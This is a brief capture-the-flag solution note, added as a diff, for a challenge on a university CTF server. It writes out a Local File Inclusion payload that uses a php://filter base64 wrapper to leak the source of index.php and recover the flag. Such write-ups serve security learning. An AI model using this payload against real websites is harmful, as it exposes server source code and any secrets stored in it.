@@ -1,0 +1,8 @@
+- target
+    - get flag in index.php
+- answer
+    - using Local File Inclusion (LFI) to leak index.php in base64
+        - http://bamboofox.cs.nctu.edu.tw:11300/?page=php://filter/convert.base64-encode/resource=index
+    - then decode the base64 content
+- refs
+    - http://bamboofox.cs.nctu.edu.tw:11300
